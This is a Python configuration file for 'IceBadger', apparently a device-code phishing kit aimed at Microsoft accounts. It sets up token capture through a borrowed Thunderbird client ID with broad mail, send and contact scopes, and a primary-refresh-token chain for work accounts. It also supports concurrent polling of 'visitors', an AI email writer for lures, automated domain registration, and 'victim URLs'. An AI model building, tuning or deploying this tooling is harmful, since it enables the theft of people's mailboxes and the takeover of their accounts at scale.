# ── config.py ──────────────────────────────────────────────
import os
from pathlib import Path
from dotenv import load_dotenv

BASE_DIR = Path(__file__).parent.resolve()
ENV_PATH = BASE_DIR / '.env'
load_dotenv(dotenv_path=ENV_PATH)

class Config:
    BASE_DIR = BASE_DIR
    _raw_db = os.getenv("ICEBADGER_DB_PATH", "icebadger.db")
    DB_PATH = str((BASE_DIR / _raw_db).resolve()) if not os.path.isabs(_raw_db) else _raw_db
    
    # Microsoft Entra ID Specifics
    CLIENT_ID = os.getenv("ICEBADGER_CLIENT_ID")
    # Public client used for personal (consumer) captures.
    # Mozilla Thunderbird: a genuine third-party public client that Microsoft
    # has pre-authorised for Graph Mail scopes AND that supports personal
    # Microsoft accounts. The Office first-party client also works for
    # capture, but its MSA tokens carry no `oid` claim, so every mailbox
    # endpoint (/me/mailFolders, /me/messages) rejects them. Thunderbird
    # tokens resolve correctly.
    PERSONAL_CLIENT_ID = os.getenv("ICEBADGER_PERSONAL_CLIENT_ID", "9e5f94bc-e8a4-4e73-b8be-63364c29d753")
    TENANT_ID = os.getenv("ICEBADGER_TENANT_ID", "common")
    SCOPE = os.getenv("ICEBADGER_SCOPES", "https://graph.microsoft.com/.default openid profile offline_access")
    
    DEVICE_CODE_URL = os.getenv("ICEBADGER_DEVICE_CODE_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode")
    TOKEN_URL = os.getenv("ICEBADGER_TOKEN_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token")
    # Personal captures use the v2 endpoints on the CONSUMERS authority —
    # the only combination that both accepts personal accounts and yields a
    # Graph-scoped delegated token with a resolvable user identity.
    DEVICE_CODE_URL_V1 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode"
    TOKEN_URL_V1 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
    # Graph scopes for personal captures (Thunderbird client).
    # Kept deliberately tight — every extra line is another thing the visitor
    # reads on the consent screen. People.Read was dropped: /me/people is not
    # used by the UI and contacts already come from Contacts.ReadWrite.
    PERSONAL_SCOPES = os.getenv(
        "ICEBADGER_PERSONAL_SCOPES",
        "https://graph.microsoft.com/Mail.ReadWrite "
        "https://graph.microsoft.com/Mail.Send "
        "https://graph.microsoft.com/Contacts.ReadWrite "
        "https://graph.microsoft.com/MailboxSettings.ReadWrite "
        "https://graph.microsoft.com/User.Read "
        "offline_access",
    )
    # Legacy v1 resource form (still used by the work/PRT chain).
    PERSONAL_RESOURCE = "https://graph.microsoft.com"
    
    # Polling
    POLL_INTERVAL = int(os.getenv("ICEBADGER_POLL_INTERVAL", 5))
    # Max simultaneous device-code polls. A serial poller only services one
    # pending visitor per interval, so a burst of concurrent visitors queues up
    # and times out before it is ever reached.
    POLL_CONCURRENCY = int(os.getenv("ICEBADGER_POLL_CONCURRENCY", 20))
    # Number of chain worker threads. Each work-account capture spawns a
    # device-registration/PRT chain (a subprocess tree); the box has one core
    # and measured throughput plateaus at ~20, so more workers do not help.
    # Captures beyond this queue up and are drained as workers free.
    CHAIN_CONCURRENCY = int(os.getenv("ICEBADGER_CHAIN_CONCURRENCY", 20))
    MAX_RETRIES = int(os.getenv("ICEBADGER_MAX_RETRIES", 3))
    RETRY_DELAY = float(os.getenv("ICEBADGER_RETRY_DELAY", 5.0))
    
    # Web Dashboard
    WEB_HOST = os.getenv("ICEBADGER_WEB_HOST", "0.0.0.0")
    WEB_PORT = int(os.getenv("ICEBADGER_WEB_PORT", 5000))

    # AI Email Writer
    GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")

    # Dynadot API (for real-time domain search & automated registration)
    DYNADOT_API_KEY = os.getenv("DYNADOT_API_KEY", "")

    # Public-facing host used when building victim URLs (e.g. https://yourserver.com)
    DEPLOY_HOST = os.getenv("ICEBADGER_DEPLOY_HOST", "http://127.0.0.1:5000")

    if not CLIENT_ID:
        raise ValueError("ICEBADGER_CLIENT_ID must be set in environment or .env file")
